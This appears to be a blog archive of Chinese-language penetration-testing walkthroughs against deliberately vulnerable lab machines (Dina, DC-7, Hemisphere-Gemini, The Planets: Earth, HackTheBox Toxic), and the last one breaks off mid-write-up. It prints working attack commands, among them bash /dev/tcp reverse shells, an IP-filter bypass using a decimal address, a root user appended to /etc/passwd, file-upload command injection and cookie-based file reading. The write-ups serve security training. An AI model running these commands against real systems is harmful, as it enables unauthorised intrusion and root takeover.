<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>一开始想直接msf懒省事，但是我的shell不能用，一直提醒报错就很烦。<br>搜索引擎上找到了跟这个CMS相关的命令执行漏洞，根据说明来尝试一下<br>先创建一个csv文件<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>写入文档给的一句话，要加上一些信息，不然过不去。<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>打开Burp Suite拦包<br>上传文件<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>在文件头那里改成cat /etc/passwd<br>forward放包后看一下网页<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>可行，那直接把内容改成反弹shell去连接渗透机kali</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo ‘bash -i&gt;&amp;/dev/tcp/192.168.55.128/2333 0&gt;&amp;1’ | bash</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>连接成功</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>直接sudo -l<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>/usr/bin/perl在运行的时候拥有root权限且不需要密码<br>利用perl进行反弹shell<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>获取到了root权限，提权成功<br>读取flag<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>至此，渗透结束。</p>
<hr>
<blockquote>
<p>在哪里存在,就在哪里绽放。不要因为难过,就忘了散发芳香。</p>
</blockquote>
<hr>
]]></content>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机DC-7的渗透记录</title>
    <url>/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<blockquote>
<p>下载地址：<a href="https://www.vulnhub.com/entry/dc-7,356/">https://www.vulnhub.com/entry/dc-7,356/</a></p>
</blockquote>
<hr>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>靶机DC-7×1  网络为NAT模式<br>渗透机kali 2021.2×1  和DC-7在同一网段</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机，ip已经给出来了。<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>直接nmap扫。<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>web开着，看一下。<br>用的Drupal 8<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"></p>
<span id="more"></span>
<p>网页上面给小提示，尝试暴力破解是行不通的，那就取巧。<br>发现网页下方的@DC7USER，百度到了github仓库。<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>把仓库下载下来<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>查看config.php文件<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>拿到了用户名密码<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>试了一下，是ssh的密码<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>ls看一下当前目录 发现有个邮件。<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>这里应该是记录下来执行了什么操作，然后文件存放在了backups目录里。<br>总之先去看一眼。<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>不出意外，接下来可能要利用这里，但是没啥思路，暂且放着百度一波drush是什么东西。<br>结果……<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>我这应该属于歪打正着了吧（）<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>改完密码直接登录进去。<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>发现有个写文章的地方，上一句话<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>没法不能执行php脚本<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>有丶小问题，不过问题不大。<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>drupal是php语言写的，怎么可以不支持呢？<br>Drupal 7引用了PHP filter模块，这个模块在新安装后是默认禁用的。<br>但是在这里的Drupal 8没有看到，可能是需要另外安装。<br>去官网找了一波，找到了拓展包。<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>下载之后，把压缩包上传上去安装即可。<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>别忘了勾选PHP filter<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>写文章（×）<br>一句话（√）<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>真离谱呀，火绒报毒，我提交的这个页面怎么说都不让我打开。只能先把火绒关了<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>一句话写好了，直接上蚁剑<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>打开蚁剑的终端，准备打一波反弹shell<br>kali这边开启监听  蚁剑打开的终端主动连<br>然后kali这边用python环境打出交互式shell<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>虽然我们不是root权限，但是我们还是可以更改backups.sh<br>这里思路挺多的，比如用这个尝试写个root权限的用户进去<br>也可以在里面写一个反弹shell。这里我选择接着打反弹shell<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>写好之后再开个窗口等着<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"><br>要记着把之前的那个关掉，不然一只占用着，这里是连不上的，等好久才发现原来没关，白等好久= =<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"><br>提权成功，获得flag。<br><img src="/2021/08/07/%E9%9D%B6%E6%9C%BADC-7%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>渗透结束。</p>
<hr>
<blockquote>
<p>何必喜一时得意，何必悲一时败挫。</p>
</blockquote>
<hr>
]]></content>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机Hemisphere-Gemini渗透记录</title>
    <url>/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Hemisphere-Gemini×1<br>渗透机kali 2021.2×1 和靶机在同一网段<br>如果网卡不一致还需要先改一下靶机网卡<br>靶机很简单很简单，放轻松~</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>老规矩，首先要确定靶机ip。先看mac地址是多少</p>
<span id="more"></span>

<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>然后扫描确定ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定ip之后用nmap进行更深层次的信息探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.163</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>80端口开着，可以先访问一下网页<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>点了点没什么东西，那就在扫一下目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u  http://192.168.155.163/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>访问/Portal 又是一个页面，先点点<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>（靶机有些简单，但也要把步骤明确好，勿喷勿喷）<br>第一种思路：<br>观察一下url<br>Sobre nosotros<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>Contacto<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>url后面的参数是view=文件 感觉可能是cat xxx<br>可能存在存在本地文件注入 (LFI)漏洞<br>手动测试了两下，果然！<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>看到了一个名字叫wlliam的普通用户，尝试了几个默认的文件目录，找到了ssh备份文件<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>好，上kali!<br>把id_rsa的内容保存在一个文件里，然后修改权限为600<br>这样就可以ssh链接了<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>查看user.txt 获得第一个flag<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
<p>第二种思路：<br>之前nmap搜集到了smb服务的信息<br>接着信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.155.163</span><br></pre></td></tr></table></figure>
<p>扫描后得到了一个名为william的账户<br>smb服务是开放的，我们还可以趁着这个机会去爆破密码<br>（这是第二种思路，放在此处仅仅为了提供一种思路）</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>接下来就要提权了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>/etc/passwd倒是第一次见，看一下权限<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>所有用户都有读写执行权限，那我们可以生成一个用户密码写入/etc/passwd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt reigniting 123456</span><br><span class="line"></span><br><span class="line">echo &#x27;reigniting:$1$reigniti$xfzUaIQTdvQl8beISQhxk/:0:0:reigniting:/home/reigniting:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>用户添加成功，接着<code>su reigniting</code><br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>提权成功，获得第二flag<br>至此，渗透结束</p>
<hr>
<blockquote>
<p>落去君休惜，飞来我自知。<br>莺愁蝶倦晚芳时，纵是明春再见隔年期。</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>靶机渗透记录</category>
      </categories>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机The Planets: Earth渗透记录</title>
    <url>/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>前段时间忙于比赛，现在要继续开始学习了，不过又因为期末了所以靶机渗透更新的还是很慢…<br>本人学疏才浅，大佬们轻喷…</p>
<hr>
<blockquote>
<p>下载地址：<a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
</blockquote>
<hr>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机The Planets: Earth×1  NAT模式<br>渗透机kali 2021.2×1 和靶机在同一网段<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"></p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>用arp-scan扫描ip，然后用mac地址确定目标<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>扫扫扫</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.164</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>根据nmap扫描的结果可以发现我们是需要加host才能打开那两个网址<br>访问靶机ip也就一个服务开启的默认界面<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>加上host之后打开</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"></p>
<span id="more"></span>
<p>测试界面，啊我不信<br>另外一个地址打开后是类似一个留言功能的业务<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>好像没啥漏洞，不过发送记录会展示在页面，发现了三串数字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line"></span><br><span class="line">3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line"></span><br><span class="line">2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>用dirb扫描了一下，发现有个后台<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>不过需要用户名和密码<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>另外一个也用dirb扫了一下，发现robots.txt是有东西的<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>比较可疑的是最后的居然屏蔽的是文件格式，那就试一下吧。<br>发现/testingnotes.txt有提示<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>去访问了一下testdata.txt，发现了几句话。<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>根据提示可以看出来，我们需要解密之前留言板上的密文————用testdata.txt异或解密<br>找在线网站解密一下，拿到了密码<code>earthclimatechangebad4humans</code><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>登录之后发现了命令行交互，于是决定打个反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.155.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>但是失败了，好像是对ip有限制<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>于是尝试绕过</p>
<blockquote>
<p><a href="https://www.ipaddressguide.com/ip">https://www.ipaddressguide.com/ip</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/3232275328/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>拿到了第一个flag<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>先去看一下/usr/bin/reset_root<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>执行失败<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>是一个可执行的二进制文件，可以利用nc传输到kali攻击机上。<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ltrace -S ./reset_root</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>可以看到程序运行的时候提示缺少了几个文件<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"><br>那咋办呢？那就创建一个吧<br>在靶机上创建好后去运行，拿到了root的密码Earth<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/29.png"><br>于是su切换到root用户输入密码<br>进入/root目录，拿到第二个flag<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/30.png"><br>至此，渗透结束。</p>
<hr>
<blockquote>
<p>暮晓春来迟，先于百花知。岁岁种桃花，开在断肠时。</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>靶机渗透记录</category>
      </categories>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机Toxic的渗透记录</title>
    <url>/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>简单的靶机，so easy box</p>
<p>初学者友好机，学累了就做一个玩玩吧^_^</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>hack the box的靶机Toxic环境</p>
<p>BurpSuite×1</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>选好靶机，打开环境</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.jpg"> </p>
<p>给出了公网地址，先去访问看一下</p>
<span id="more"></span>

<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.jpg"> </p>
<p>是一个简单的页面 目前没有看到什么东西</p>
<p>然后把提供的源代码也下载下来进行代码审计</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.jpg"> </p>
<p>在这里可以清晰的看到 网页的cookie值是序列化后在进行base64编码得到的</p>
<p>且里面带有要访问地址的目录（/www/index.html）</p>
<p>于是用BurpSuite进行抓包</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.jpg"></p>
<p>找个网站解密一下</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.jpg"></p>
<p>确实是这样的，那么思路就来了</p>
<p>后面要读取的内容是index.html，那我们可不可以换成别的读取呢？</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"></p>
<p>s代表是长度，所以这里要改成15（/ect/passwd长度为15）</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.jpg"></p>
<p>把编码过的cookie值放进去可以看到，确实能读取到敏感信息</p>
